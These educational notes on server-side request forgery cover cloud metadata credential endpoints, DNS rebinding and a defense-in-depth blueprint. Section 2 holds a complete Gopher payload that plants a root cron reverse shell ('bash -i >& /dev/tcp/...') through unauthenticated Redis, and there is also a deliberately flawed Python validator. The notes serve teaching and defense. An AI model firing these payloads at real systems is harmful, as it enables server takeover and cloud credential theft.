# Advanced Engineering Notes & Deep Dive: Server-Side Request Forgery (SSRF)

---

## 1. Cloud Instance Metadata Services (IMDS): Comprehensive Architecture

In modern cloud computing environments, virtual machines (VMs) and containers rely on the link-local IP address **`169.254.169.254`** (defined in RFC 3927) to discover operational metadata, network configuration, and temporary cryptographic credentials. When an SSRF vulnerability is discovered in a cloud-hosted application, querying the IMDS endpoint is frequently the primary route to full cloud infrastructure compromise.

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           CLOUD IMDS ARCHITECTURAL COMPARISON                           |
|                                                                                         |
|  [ Cloud Provider ]     [ Primary Metadata Endpoint ]          [ Key Security Controls ]|
|                                                                                         |
|  1. AWS EC2             http://169.254.169.254/latest/meta-data/  IMDSv1: No headers    |
|                         .../iam/security-credentials/<ROLE>    IMDSv2: Mandatory Token  |
|                                                                                         |
|  2. Google Cloud (GCP)  http://169.254.169.254/computeMetadata/v1/ Mandatory Header:  |
|                         .../instance/service-accounts/token    Metadata-Flavor: Google  |
|                                                                                         |
|  3. Microsoft Azure     http://169.254.169.254/metadata/instance  Mandatory Header:     |
|                         ...api-version=2021-02-01              Metadata: true           |
|                                                                                         |
|  4. DigitalOcean        http://169.254.169.254/metadata/v1/    Direct JSON Response     |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

### Deep Dive: AWS IMDSv1 vs IMDSv2
The 2019 Capital One breach (compromising over 100 million customer records) exploited an SSRF vulnerability in an open-source WAF to query AWS IMDSv1, stealing temporary IAM role credentials. In response, AWS introduced **IMDSv2**:

- **IMDSv1 (Vulnerable to simple SSRF):**
  A simple `GET` request retrieves the temporary security tokens:
  ```bash
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole
  ```
- **IMDSv2 (Session-oriented & Defense-in-Depth):**
  Requires a two-step flow using a custom HTTP method and header:
  ```bash
  # Step 1: Request a session token (valid for 6 hours) via PUT:
  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

  # Step 2: Use the token in a custom header to access metadata:
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole
  ```
- **The Hop-Limit Control:** AWS EC2 allows setting `http-put-response-hop-limit=1`. In containerized environments (Docker/Kubernetes), this ensures that requests originating from containers (which require 2 network hops) are discarded before reaching the host's metadata service.

---

## 2. Protocol Smuggling via SSRF: Gopher to Remote Code Execution (RCE)

If the server-side HTTP client library supports legacy or arbitrary network schemes (such as `libcurl` compiled with default protocol support), SSRF can be escalated into **Remote Code Execution (RCE)** using the **Gopher protocol** (`gopher://`).

The Gopher protocol allows sending arbitrary raw TCP byte streams without HTTP formatting or headers:

```
gopher://<target_ip>:<port>/_<raw_url_encoded_payload>
```

### Case Study: Gopher SSRF against Unauthenticated Redis (Port 6379)
Many internal Redis deployments run without authentication because they assume the network is isolated. An attacker can use Gopher SSRF to issue Redis serialization protocol (RESP) commands to write an SSH public key into `/root/.ssh/authorized_keys` or write a cron job:

```text
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a* * * * * bash -i >& /dev/tcp/10.10.X.Y/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```
When the vulnerable server processes this Gopher URL, it establishes a raw TCP socket to `127.0.0.1:6379`, issues the Redis commands, saves a reverse shell into `/var/spool/cron/root`, and grants the attacker full root access!

---

## 3. DNS Rebinding Attacks (TOCTOU Bypass)

A common developer implementation error is checking the destination IP before initiating the request:
```python
# FLAWED DEFENSE:
import socket, requests

def fetch_url(user_url):
    hostname = extract_hostname(user_url)
    ip = socket.gethostbyname(hostname)
    
    # Check if IP is private (RFC 1918 or Loopback):
    if is_private_ip(ip):
        return "Forbidden", 403
        
    # FETCH URL (VULNERABLE TO TIME-OF-CHECK TO TIME-OF-USE):
    return requests.get(user_url).text
```

### Exploitation Dynamics:
An attacker controls an authoritative DNS nameserver for domain `rebind.evil.thm`.
1. **Request 1 (Validation Phase):** The nameserver responds with a legitimate public IP (`198.51.100.5`) with `TTL = 0 seconds`.
2. The server's validation function checks `198.51.100.5`, confirms it is a public IP, and approves the request.
3. **Request 2 (Fetch Phase):** Because the DNS TTL was 0, `requests.get()` must resolve the hostname a second time.
4. The attacker's nameserver responds with `127.0.0.1`.
5. The HTTP client connects directly to `127.0.0.1`, completely bypassing the check!

### Defense:
Applications must **pin the resolved IP** and connect directly to that socket, verifying the IP address *at the moment of connection establishment* rather than validating hostnames.

---

## 4. Architectural Hardening & Mitigation Blueprint

To eliminate SSRF at an enterprise level:

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           ENTERPRISE SSRF DEFENSE IN DEPTH                              |
|                                                                                         |
|  [ Layer 1: Strict Network Egress Filtering ]                                           |
|  - Configure network firewalls (iptables / AWS Security Groups) on application servers  |
|    to block outbound connections to RFC 1918 private subnets and 169.254.169.254.     |
|                                                                                         |
|  [ Layer 2: Dedicated Egress Proxy Isolation ]                                          |
|  - Route all legitimate outbound external resource fetching through a dedicated,        |
|    hardened forward proxy located in a segregated DMZ with no internal route access.   |
|                                                                                         |
|  [ Layer 3: Protocol Restriction in HTTP Clients ]                                      |
|  - Restrict client libraries strictly to HTTP and HTTPS. Explicitly disable support     |
|    for file://, gopher://, dict://, ftp://, and ldap://.                               |
|  - Disable automatic redirect following (do not follow 301/302 redirects blindly).    |
|                                                                                         |
|  [ Layer 4: Cloud IMDSv2 Enforcement ]                                                  |
|  - Set metadata token requirement: `HttpTokens=required` across all cloud instances.   |
|  - Enforce hop limit = 1 on container hosts to isolate metadata from tenant containers. |
+─────────────────────────────────────────────────────────────────────────────────────────+
```
